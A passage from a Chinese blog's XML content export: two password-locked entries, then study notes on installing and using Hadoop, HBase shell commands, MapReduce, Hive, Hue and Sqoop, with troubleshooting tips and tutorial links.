id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>链接收集</category>
      </categories>
      <tags>
        <tag>链接</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>2019年12月笔记</title>
    <url>/2019%E5%B9%B412%E6%9C%88%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
  </entry>
  <entry>
    <title>Hadoop入门笔记</title>
    <url>/Hadoop%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="Hadoop-安装以及（伪）分布式集群"><a href="#Hadoop-安装以及（伪）分布式集群" class="headerlink" title="Hadoop 安装以及（伪）分布式集群"></a>Hadoop 安装以及（伪）分布式集群</h2><h3 id="经典教程："><a href="#经典教程：" class="headerlink" title="经典教程："></a>经典教程：</h3><p><a href="http://dblab.xmu.edu.cn/blog/1258-2/" target="_blank" rel="noopener">Hadoop安装</a><br><a href="http://dblab.xmu.edu.cn/blog/1952-2/" target="_blank" rel="noopener">在阿里云中搭建大数据实验环境</a>    —-仅有点儿参考价值<br><a id="more"></a></p>
<h3 id="注解："><a href="#注解：" class="headerlink" title="注解："></a>注解：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/etc/profile:此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行，并</span><br><span class="line">从/etc/profile.d目录的配置文件中搜集shell的设置，</span><br><span class="line"></span><br><span class="line">/etc/bashrc:为每一个运行bash shell的用户执行此文件，当bash shell被打开时,该文件被</span><br><span class="line">读取。</span><br><span class="line"></span><br><span class="line">~/.bash_profile:每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,</span><br><span class="line">该文件仅仅执行一次!默认情况下,他设置一些环境变量,执行用户的.bashrc文件。</span><br><span class="line"></span><br><span class="line">~/.bashrc:该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell</span><br><span class="line">时,该文件被读取。</span><br><span class="line"></span><br><span class="line">***hadoop 的 JAVA 变量必须在 ~/.bashrc，尽量使用 1.8 版本，后面的 sbt 版本要求是 1.8***</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hadoop 附带了丰富的例子（运行 </span><br><span class="line">./bin/hadoop jar ./share/hadoop/mapreduce/hadoop-mapreduce-examples-2.6.0.jar </span><br><span class="line">可以看到所有例子），包括 wordcount、terasort、join、grep 等。</span><br><span class="line"></span><br><span class="line">在此我们选择运行 grep 例子，我们将 input 文件夹中的所有文件作为输入，筛选当中符合正</span><br><span class="line">则表达式 dfs[a-z.]+ 的单词并统计出现的次数，最后输出结果到 output 文件夹中。</span><br><span class="line"></span><br><span class="line">注意，Hadoop 默认不会覆盖结果文件，因此再次运行上面实例会提示出错，需要先将 ./output 删除。</span><br><span class="line">rm -r ./output</span><br></pre></td></tr></table></figure>
<h3 id="hadoop-命令"><a href="#hadoop-命令" class="headerlink" title="hadoop 命令"></a>hadoop 命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启动/关闭：</span><br><span class="line"></span><br><span class="line">start-all.sh   //这个 hadoop 启动命令会和 spark 命令重复，所以会提示缺少一个</span><br><span class="line">spark的jar包，不影响hadoop的启动。要再执行下 jobhistory 脚本</span><br><span class="line"></span><br><span class="line">start-dfs.sh</span><br><span class="line">start-yarn.sh</span><br><span class="line">mr-jobhistory-daemon.sh start historyserver  //支持查看作业历史运行信息</span><br><span class="line"></span><br><span class="line">如何通过Web查看job的运行情况: https://www.linuxidc.com/Linux/2015-05/117501.htm</span><br><span class="line"></span><br><span class="line">http://master:50070/</span><br><span class="line">http://master:8088/cluster</span><br><span class="line"></span><br><span class="line">HDFS操作常用Shell命令：http://dblab.xmu.edu.cn/blog/1625-2/</span><br><span class="line">HDFS Shell命令官方文档：http://hadoop.apache.org/docs/r2.5.2/hadoop-project-dist/hadoop-common/FileSystemShell.html</span><br></pre></td></tr></table></figure>
<h2 id="利用Java-API与HDFS进行交互"><a href="#利用Java-API与HDFS进行交互" class="headerlink" title="利用Java API与HDFS进行交互"></a>利用Java API与HDFS进行交互</h2><h3 id="经典教程：-1"><a href="#经典教程：-1" class="headerlink" title="经典教程："></a>经典教程：</h3><p><a href="http://dblab.xmu.edu.cn/blog/290-2/" target="_blank" rel="noopener">大数据技术原理与应用 第三章 分布式文件系统HDFS 学习指南</a></p>
<p><a href="http://hadoop.apache.org/docs/stable/api/" target="_blank" rel="noopener">HAdoop API</a></p>
<h3 id="爬坑"><a href="#爬坑" class="headerlink" title="爬坑"></a>爬坑</h3><p>注：</p>
<p>有可能会报错，原因需要代码中添加用户名、密码。</p>
<h2 id="hbase"><a href="#hbase" class="headerlink" title="hbase"></a>hbase</h2><p>HBase是一个分布式的、面向列的开源数据库,一个结构化数据的分布式存储系统”。就像Bigtable利用了Google文件系统（File System）所提供的分布式数据存储一样，HBase在Hadoop之上提供了类似于Bigtable的能力。HBase是Apache的Hadoop项目的子项目。HBase不同于一般的关系数据库，它是一个适合于<strong>非结构化数据存储的数据库</strong>。另一个不同的是<strong>HBase基于列的而不是基于行的模式</strong>。</p>
<h3 id="经典教程：-2"><a href="#经典教程：-2" class="headerlink" title="经典教程："></a>经典教程：</h3><p><a href="http://dblab.xmu.edu.cn/blog/install-hbase/" target="_blank" rel="noopener">大数据原理与应用 第四章 分布式数据库HBase 学习指南</a></p>
<h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">运行HBase:</span><br><span class="line">第一步：首先启动Hadoop，如果已经启动hadoop请跳过此步骤。命令如下：</span><br><span class="line"></span><br><span class="line">start-all.sh</span><br><span class="line"></span><br><span class="line">第二步：切换目录至/usr/local/hbase;再启动HBase.命令如下：</span><br><span class="line"></span><br><span class="line">cd /usr/local/hbase</span><br><span class="line">./bin/start-hbase.sh</span><br><span class="line"></span><br><span class="line">进入HBase Shell交互式执行环境：</span><br><span class="line"></span><br><span class="line">cd /usr/local/hbase</span><br><span class="line">./bin/hbase shell</span><br><span class="line"></span><br><span class="line">Hadoop的HDFS中查看变化：</span><br><span class="line"></span><br><span class="line">linziyu@iZbp11gznj7n38xkztu64dZ:/usr/local/hadoop$ ./bin/hdfs dfs -ls /</span><br><span class="line">Found 2 items</span><br><span class="line">drwxr-xr-x   - linziyu supergroup          0 2018-04-11 17:35 /hbase</span><br><span class="line">drwxr-xr-x   - linziyu supergroup          0 2018-04-06 22:40 /user</span><br><span class="line">可以看到，在HDFS中，自动生成了一个“/hbase”目录，用来保存HBase的数据。</span><br><span class="line"></span><br><span class="line">注意：如果在操作HBase的过程中发生错误，可以通过&#123;HBASE_HOME&#125;目录</span><br><span class="line">（/usr/local/hbase）下的logs子目录中的日志文件查看错误原因。</span><br><span class="line">这里启动关闭Hadoop和HBase的顺序一定是：</span><br><span class="line">启动Hadoop—&gt;启动HBase—&gt;关闭HBase—&gt;关闭Hadoop</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR: Can&apos;t get master address from ZooKeeper; znode data == null</span><br><span class="line">as:</span><br><span class="line">重启hbase（可能是zookeeper或hbase不稳定造成的 重启不一定起作用）</span><br><span class="line">or</span><br><span class="line">执行hdfs格式化命令：hadoop namenode -format  (删除临时文件/格式化)</span><br></pre></td></tr></table></figure>
<h3 id="HBase-常用Shell命令"><a href="#HBase-常用Shell命令" class="headerlink" title="HBase 常用Shell命令"></a>HBase 常用Shell命令</h3><table>
<thead>
<tr>
<th>hbase shell命令</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>alter</td>
<td>修改列族（column family）模式</td>
</tr>
<tr>
<td>count</td>
<td>统计表中行的数量</td>
</tr>
<tr>
<td>create</td>
<td>创建表</td>
</tr>
<tr>
<td>describe</td>
<td>显示表相关的详细信息</td>
</tr>
<tr>
<td>delete</td>
<td>删除指定对象的值（可以为表，行，列对应的值，另外也可以指定时间戳的值）</td>
</tr>
<tr>
<td>deleteall</td>
<td>删除指定行的所有元素值</td>
</tr>
<tr>
<td>disable</td>
<td>使表无效</td>
</tr>
<tr>
<td>drop</td>
<td>删除表</td>
</tr>
<tr>
<td>enable</td>
<td>使表有效</td>
</tr>
<tr>
<td>exists</td>
<td>测试表是否存在</td>
</tr>
<tr>
<td>exit</td>
<td>退出hbase shell</td>
</tr>
<tr>
<td>get</td>
<td>获取行或单元（cell）的值</td>
</tr>
<tr>
<td>incr</td>
<td>增加指定表，行或列的值</td>
</tr>
<tr>
<td>list</td>
<td>列出hbase中存在的所有表</td>
</tr>
<tr>
<td>put</td>
<td>向指向的表单元添加值</td>
</tr>
<tr>
<td>tools</td>
<td>列出hbase所支持的工具</td>
</tr>
<tr>
<td>scan</td>
<td>通过对表的扫描来获取对用的值</td>
</tr>
<tr>
<td>status</td>
<td>返回hbase集群的状态信息</td>
</tr>
<tr>
<td>shutdown</td>
<td>关闭hbase集群（与exit不同）</td>
</tr>
<tr>
<td>truncate</td>
<td>重新创建指定表</td>
</tr>
<tr>
<td>version</td>
<td>返回hbase版本信息</td>
</tr>
</tbody>
</table>
<h4 id="表的管理"><a href="#表的管理" class="headerlink" title="表的管理"></a>表的管理</h4><p>1）通过list可以列出所有已创建的表(除-ROOT表和.META表(被过滤掉了))</p>
<p><code>hbase(main)&gt; list</code></p>
<p>2）创建表，其中t1是表名，f1、f2是t1的列族。hbase中的表至少有一个列族.它们之中，列族直接影响hbase数据存储的物理特性。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：create &lt;table&gt;, &#123;NAME =&gt; &lt;family&gt;, VERSIONS =&gt; &lt;VERSIONS&gt;&#125; </span><br><span class="line"></span><br><span class="line">例如：创建表t1，有两个family name：f1，f2，且版本数均为2</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; create &apos;t1&apos;,&#123;NAME =&gt; &apos;f1&apos;, VERSIONS =&gt; 2&#125;,&#123;NAME =&gt; &apos;f2&apos;, VERSIONS =&gt; 2&#125;</span><br></pre></td></tr></table></figure></p>
<p>3）删除表<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">分两步：首先disable，然后drop</span><br><span class="line">例如：删除表t1</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; disable &apos;t1&apos;</span><br><span class="line">hbase(main)&gt; drop &apos;t1&apos;</span><br></pre></td></tr></table></figure></p>
<p>4）查看表的结构<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：describe(desc) &lt;table&gt; （可以看到这个表的所有默认参数）</span><br><span class="line">例如：查看表t1的结构</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; describe &apos;t1&apos; / desc  &apos;t1&apos;</span><br></pre></td></tr></table></figure></p>
<p>5）修改表结构<br>修改表结构必须先disable<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：alter &apos;t1&apos;, &#123;NAME =&gt; &apos;f1&apos;&#125;, &#123;NAME =&gt; &apos;f2&apos;, METHOD =&gt; &apos;delete&apos;&#125;</span><br><span class="line">例如：修改表test1的cf的TTL为180天</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; disable &apos;test1&apos;</span><br><span class="line">hbase(main)&gt; alter &apos;test1&apos;,&#123;NAME=&gt;&apos;body&apos;,TTL=&gt;&apos;15552000&apos;&#125;,&#123;NAME=&gt;&apos;meta&apos;, TTL=&gt;&apos;15552000&apos;&#125;</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; enable &apos;test1&apos;</span><br></pre></td></tr></table></figure></p>
<p>6)查看表中所有记录 scan<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：scan &apos;tablename&apos;</span><br><span class="line"></span><br><span class="line">scan &apos;wc&apos;</span><br></pre></td></tr></table></figure></p>
<p>7)alter<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：alter ‘tablename’,NAME=&gt;’familyname’,attribute=&gt;new_value </span><br><span class="line"></span><br><span class="line">例子：给表添加列族 alter</span><br><span class="line">添加一个名字叫sid的列族VERSIONS值为5</span><br><span class="line"></span><br><span class="line">alter &apos;wc&apos;,NAME=&gt;&apos;sid&apos;,VERSION=&gt;5</span><br></pre></td></tr></table></figure></p>
<p>8）删除列族，需首先将表disable<br><code>alter ‘tablename’,’delete’=&gt;’column family’</code><br>删除一个列族之后，这个列族的数据也会全部被删除。<br>9)删除表范围运算符，需首先将表disable<br><code>alter ‘tablename’,METHOD=&gt;’table_att_unset’,NAME=&gt;’MAX_FILESIZE’</code><br>10)incr 计数器<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">incr &apos;tablename&apos;,&apos;rowkey&apos;,&apos;column family:column&apos; step     </span><br><span class="line">step是步长，可选，默认为1</span><br><span class="line"></span><br><span class="line">给‘id’这个行健增加&apos;column_famaly1:addr&apos;字段，并使用counter实现递增</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">hbase(main):002:0&gt; incr &apos;table&apos;,&apos;id&apos;,&apos;column_famaly1:addr&apos;</span><br><span class="line">COUNTER VALUE = 1</span><br><span class="line">0 row(s) </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">hbase(main):003:0&gt; incr &apos;table&apos;,&apos;id&apos;,&apos;column_famaly1:addr&apos;</span><br><span class="line">COUNTER VALUE = 2</span><br><span class="line">0 row(s) </span><br><span class="line"> </span><br><span class="line">hbase(main):004:0&gt; get &apos;table&apos;,&apos;id&apos;,&apos;column_famaly1:addr&apos;</span><br><span class="line">COLUMN                CELL                                                      </span><br><span class="line"> column_famaly1:addr  timestamp=1463056705124, value=\x00\x00\x00\x00\x00\x00\x0</span><br><span class="line">                      0\x02                                                     </span><br><span class="line">1 row(s) </span><br><span class="line"> </span><br><span class="line">hbase(main):005:0&gt; incr &apos;table&apos;,&apos;id&apos;,&apos;column_famaly1:addr&apos;</span><br><span class="line">COUNTER VALUE = 3</span><br><span class="line">0 row(s)</span><br></pre></td></tr></table></figure>
<p>11)获取计数器当前值</p>
<p><code>get_counter &#39;tablename&#39;,&#39;rowkey&#39;,&#39;column family:column&#39;</code></p>
<h4 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h4><p>1）分配权限<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法 : grant &lt;user&gt; &lt;permissions&gt; &lt;table&gt; &lt;column family&gt; &lt;column qualifier&gt; 参数后面用逗号分隔</span><br><span class="line"></span><br><span class="line">权限用五个字母表示： &quot;RWXCA&quot;.</span><br><span class="line"></span><br><span class="line">READ(&apos;R&apos;), WRITE(&apos;W&apos;), EXEC(&apos;X&apos;), CREATE(&apos;C&apos;), ADMIN(&apos;A&apos;)</span><br><span class="line"></span><br><span class="line">例如，给用户‘test&apos;分配对表t1有读写的权限，</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; grant &apos;test&apos;,&apos;RW&apos;,&apos;t1&apos;</span><br></pre></td></tr></table></figure></p>
<p>2）查看权限<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：user_permission &lt;table&gt;</span><br><span class="line">例如，查看表t1的权限列表</span><br><span class="line">hbase(main)&gt; user_permission &apos;t1&apos;</span><br></pre></td></tr></table></figure></p>
<p>3）收回权限<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">与分配权限类似，语法：revoke &lt;user&gt; &lt;table&gt; &lt;column family&gt; &lt;column qualifier&gt;</span><br><span class="line">例如，收回test用户在表t1上的权限</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; revoke &apos;test&apos;,&apos;t1&apos;</span><br></pre></td></tr></table></figure></p>
<p>4)将表设置为只读模式<br><code>alter ‘tablename’,READONLY</code></p>
<h4 id="表数据的增删改查"><a href="#表数据的增删改查" class="headerlink" title="表数据的增删改查"></a>表数据的增删改查</h4><h5 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：put &lt;table&gt;,&lt;rowkey&gt;,&lt;family:column&gt;,&lt;value&gt;,&lt;timestamp&gt;</span><br><span class="line"></span><br><span class="line">例如：给表t1的添加一行记录：rowkey是rowkey001，family name：f1，column name：col1，value：value01，timestamp：系统默认</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; put &apos;t1&apos;,&apos;rowkey001&apos;,&apos;f1:col1&apos;,&apos;value01&apos;</span><br></pre></td></tr></table></figure>
<h5 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h5><p>a）查询某行记录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：get &lt;table&gt;,&lt;rowkey&gt;,[&lt;family:column&gt;,....]</span><br><span class="line"></span><br><span class="line">例如：查询表t1，rowkey001中的f1下的col1的值</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; get &apos;t1&apos;,&apos;rowkey001&apos;, &apos;f1:col1&apos;</span><br><span class="line">或者：</span><br><span class="line">hbase(main)&gt; get &apos;t1&apos;,&apos;rowkey001&apos;, &#123;COLUMN=&gt;&apos;f1:col1&apos;&#125;</span><br><span class="line"></span><br><span class="line">查询表t1，rowke002中的f1下的所有列值</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; get &apos;t1&apos;,&apos;rowkey001&apos;</span><br></pre></td></tr></table></figure></p>
<p>b）扫描表<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：scan &lt;table&gt;, &#123;COLUMNS =&gt; [ &lt;family:column&gt;,.... ], LIMIT =&gt; num&#125;</span><br><span class="line"></span><br><span class="line">另外，还可以添加STARTROW、TIMERANGE和FITLER等高级功能</span><br><span class="line"></span><br><span class="line">例如：扫描表t1的前5条数据</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; scan &apos;t1&apos;,&#123;LIMIT=&gt;5&#125;</span><br></pre></td></tr></table></figure></p>
<p>c）查询表中的数据行数<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：count &lt;table&gt;, &#123;INTERVAL =&gt; intervalNum, CACHE =&gt; cacheNum&#125;</span><br><span class="line">INTERVAL设置多少行显示一次及对应的rowkey，默认1000；CACHE每次去取的缓存区大小，默</span><br><span class="line">认是10，调整该参数可提高查询速度</span><br><span class="line"></span><br><span class="line">例如，查询表t1中的行数，每100条显示一次，缓存区为500</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; count &apos;t1&apos;, &#123;INTERVAL =&gt; 100, CACHE =&gt; 500&#125;</span><br></pre></td></tr></table></figure></p>
<h5 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h5><p>a )删除行中的某个列值<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：delete &lt;table&gt;, &lt;rowkey&gt;,  &lt;family:column&gt; , &lt;timestamp&gt;,必须指定列名</span><br><span class="line"></span><br><span class="line">例如：删除表t1，rowkey001中的f1:col1的数据</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; delete &apos;t1&apos;,&apos;rowkey001&apos;,&apos;f1:col1&apos;</span><br><span class="line"></span><br><span class="line">注：将删除改行f1:col1列所有版本的数据</span><br></pre></td></tr></table></figure></p>
<p>b )删除行<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：deleteall &lt;table&gt;, &lt;rowkey&gt;,  &lt;family:column&gt; , &lt;timestamp&gt;，可以不指定列名，删除整行数据</span><br><span class="line"></span><br><span class="line">例如：删除表t1，rowk001的数据</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; deleteall &apos;t1&apos;,&apos;rowkey001&apos;</span><br></pre></td></tr></table></figure></p>
<p>c）删除表中的所有数据<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法： truncate &lt;table&gt;</span><br><span class="line"></span><br><span class="line">其具体过程是：disable table -&gt; drop table -&gt; create table</span><br><span class="line"></span><br><span class="line">例如：删除表t1的所有数据</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; truncate &apos;t1&apos;</span><br></pre></td></tr></table></figure></p>
<h4 id="组命令Group-name"><a href="#组命令Group-name" class="headerlink" title="组命令Group name"></a>组命令Group name</h4><p>1)查看当前集群状态</p>
<p><code>status</code></p>
<p>2)查看当前用户是谁</p>
<p><code>whoami</code></p>
<p>3)创建命名空间</p>
<p><code>create_namespace &#39;ns name&#39;</code></p>
<p>4)查看有哪些命名空间</p>
<p><code>list_namespace</code></p>
<p>5)删除命名空间</p>
<p><code>drop_namespace &#39;ns name&#39;</code></p>
<h4 id="Region管理"><a href="#Region管理" class="headerlink" title="Region管理"></a>Region管理</h4><p>1）移动region<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：move &apos;encodeRegionName&apos;, &apos;ServerName&apos;</span><br><span class="line"></span><br><span class="line">encodeRegionName指的regioName后面的编码，ServerName指的是master-status的Region Servers列表</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line">hbase(main)&gt;move &apos;4343995a58be8e5bbc739af1e91cd72d&apos;, &apos;db-41.xxx.xxx.org,60020,1390274516739&apos;</span><br></pre></td></tr></table></figure></p>
<p>2）开启/关闭region<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：balance_switch true|false</span><br><span class="line"></span><br><span class="line">hbase(main)&gt; balance_switch</span><br></pre></td></tr></table></figure></p>
<p>3）手动split</p>
<p><code>语法：split &#39;regionName&#39;, &#39;splitKey&#39;</code></p>
<p>4）手动触发major compaction<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">Compact all regions in a table:</span><br><span class="line">hbase&gt; major_compact &apos;t1&apos;</span><br><span class="line">Compact an entire region:</span><br><span class="line">hbase&gt; major_compact &apos;r1&apos;</span><br><span class="line">Compact a single column family within a region:</span><br><span class="line">hbase&gt; major_compact &apos;r1&apos;, &apos;c1&apos;</span><br><span class="line">Compact a single column family within a table:</span><br><span class="line">hbase&gt; major_compact &apos;t1&apos;, &apos;c1&apos;</span><br></pre></td></tr></table></figure></p>
<h4 id="配置管理及节点重启"><a href="#配置管理及节点重启" class="headerlink" title="配置管理及节点重启"></a>配置管理及节点重启</h4><p>1）修改hdfs配置<br><code>hdfs配置位置：/etc/hadoop/conf</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">同步hdfs配置</span><br><span class="line"></span><br><span class="line">cat /home/hadoop/slaves|xargs -i -t scp /etc/hadoop/conf/hdfs-site.xml hadoop@&#123;&#125;:/etc/hadoop/conf/hdfs-site.xml</span><br><span class="line"></span><br><span class="line">关闭：</span><br><span class="line"></span><br><span class="line">cat /home/hadoop/slaves|xargs -i -t ssh hadoop@&#123;&#125; &quot;sudo /home/hadoop/cdh4/hadoop-2.0.0-cdh4.2.1/sbin/hadoop-daemon.sh --config /etc/hadoop/conf stop datanode&quot;</span><br><span class="line"></span><br><span class="line">启动：</span><br><span class="line"></span><br><span class="line">cat /home/hadoop/slaves|xargs -i -t ssh hadoop@&#123;&#125; &quot;sudo /home/hadoop/cdh4/hadoop-2.0.0-cdh4.2.1/sbin/hadoop-daemon.sh --config /etc/hadoop/conf start datanode&quot;</span><br></pre></td></tr></table></figure></p>
<p>2）修改hbase配置<br>hbase配置位置：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">同步hbase配置</span><br><span class="line"></span><br><span class="line">cat /home/hadoop/hbase/conf/regionservers|xargs -i -t scp /home/hadoop/hbase/conf/hbase-site.xml hadoop@&#123;&#125;:/home/hadoop/hbase/conf/hbase-site.xml</span><br><span class="line"> </span><br><span class="line">graceful重启</span><br><span class="line"></span><br><span class="line">cd ~/hbase</span><br><span class="line">bin/graceful_stop.sh --restart --reload --debug inspurXXX.xxx.xxx.org</span><br></pre></td></tr></table></figure></p>
<h2 id="MapReduce"><a href="#MapReduce" class="headerlink" title="MapReduce"></a>MapReduce</h2><p>MapReduce是一种编程模型，用于大规模数据集（大于1TB）的并行运算。概念”Map（映射）”和”Reduce（归约）”，是它们的主要思想，都是从函数式编程语言里借来的，还有从矢量编程语言里借来的特性。</p>
<p>MapReduce是面向大数据并行处理的计算模型、框架和平台。</p>
<h3 id="经典教程：-3"><a href="#经典教程：-3" class="headerlink" title="经典教程："></a>经典教程：</h3><p><a href="大数据技术原理与应用">大数据技术原理与应用 MOOC 慕课</a><br><a href="http://dblab.xmu.edu.cn/blog/hadoop-build-project-using-eclipse/" target="_blank" rel="noopener">使用Eclipse编译运行MapReduce程序_Hadoop2.6.0_Ubuntu/CentOS</a><br><a href="http://dblab.xmu.edu.cn/blog/hadoop-build-project-by-shell/" target="_blank" rel="noopener">使用命令行编译打包运行自己的MapReduce程序 Hadoop2.6.0</a></p>
<h3 id="爬坑-1"><a href="#爬坑-1" class="headerlink" title="爬坑"></a>爬坑</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error：</span><br><span class="line">hadoop@Master:/usr/local/hadoop$ bin/hdfs dfs -put etc/hadoop input</span><br><span class="line">put: `input&apos;: No such file or directory</span><br><span class="line"></span><br><span class="line">as: 主要是命令老了吧</span><br><span class="line">hadoop@Master:/usr/local/hadoop$ ./bin/hdfs dfs -mkdir -p /user/hadoop</span><br><span class="line">hadoop@Master:/usr/local/hadoop$ ./bin/hdfs dfs -mkdir -p /user/hadoop/input</span><br><span class="line">hadoop@Master:/usr/local/hadoop$ hadoop fs -put /usr/local/hadoop/etc/hadoop/hdfs-site.xml /user/hadoop/input</span><br><span class="line">hadoop@Master:/usr/local/hadoop$ hadoop fs -put /usr/local/hadoop/etc/hadoop/core-site.xml /user/hadoop/input</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">有时候一些 eclipse 插件安装之后，打开 eclipse 死活都不显示</span><br><span class="line">as:</span><br><span class="line">把 eclipse/configuration/org.eclipse.update 删除掉</span><br></pre></td></tr></table></figure>
<h2 id="Hive-（数据仓库工具）"><a href="#Hive-（数据仓库工具）" class="headerlink" title="Hive （数据仓库工具）"></a>Hive （数据仓库工具）</h2><p>hive 是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。 其优点是学习成本低，可以通过类SQL语句快速实现简单的MapReduce统计，不必开发专门的MapReduce应用，十分适合数据仓库的统计分析。</p>
<p>Hue 是cdh专门的一套web管理器，它包括3个部分hue ui，hue server，hue db。hue提供所有的cdh组件的shell界面的接口。你可以在hue编写mr，查看修改hdfs的文件，管理hive的元数据，运行Sqoop，编写Oozie工作流等大量工作。</p>
<h3 id="经典教程"><a href="#经典教程" class="headerlink" title="经典教程"></a>经典教程</h3><p><a href="http://dblab.xmu.edu.cn/blog/1080-2/" target="_blank" rel="noopener">大数据技术原理与应用 第十四章 基于Hadoop的数据仓库Hive 学习指南</a>—–包含基本命令<br><a href="http://dblab.xmu.edu.cn/blog/1892/" target="_blank" rel="noopener">Hive的可视化操作(Hue)</a><br><a href="http://gethue.com/getting-started-with-hue-in-2-minutes-with-docker/" target="_blank" rel="noopener">Hue官方教程</a><br><a href="https://www.cnblogs.com/smartloli/p/4527168.html" target="_blank" rel="noopener">高可用Hadoop平台－Hue In Hadoop</a></p>
<h3 id="爬坑-2"><a href="#爬坑-2" class="headerlink" title="爬坑"></a>爬坑</h3><p>mysql的连接jar版本；<br>HDFS的文件、缓存似乎也有影响<br>mysql的账号密码很坑<br>hive的配置修改一定不能错</p>
<h2 id="sqoop"><a href="#sqoop" class="headerlink" title="sqoop"></a>sqoop</h2><p>Sqoop(发音：skup)是一款开源的工具，主要用于在Hadoop(Hive)与传统的数据库(mysql、postgresql…)间进行数据的传递，可以将一个关系型数据库（例如 ： MySQL ,Oracle ,Postgres等）中的数据导进到Hadoop的HDFS中，也可以将HDFS的数据导进到关系型数据库中。</p>
<h3 id="经典教程-1"><a href="#经典教程-1" class="headerlink" title="经典教程"></a>经典教程</h3><p><a href="http://dblab.xmu.edu.cn/blog/install-sqoop1/" target="_blank" rel="noopener">Ubuntu安装Sqoop</a><br><a href="http://dblab.xmu.edu.cn/blog/959/" target="_blank" rel="noopener">大数据案例-步骤一:本地数据集上传到数据仓库Hive</a><br><a href="http://dblab.xmu.edu.cn/blog/1005/" target="_blank" rel="noopener">大数据案例-步骤二：Hive数据分析</a><br><a href="http://dblab.xmu.edu.cn/blog/1059-2/" target="_blank" rel="noopener">大数据案例-步骤三：Hive、MySQL、HBase数据互导</a><br><a href="http://dblab.xmu.edu.cn/blog/1130-2/" target="_blank" rel="noopener">大数据案例-步骤四:利用R进行数据可视化分析</a></p>
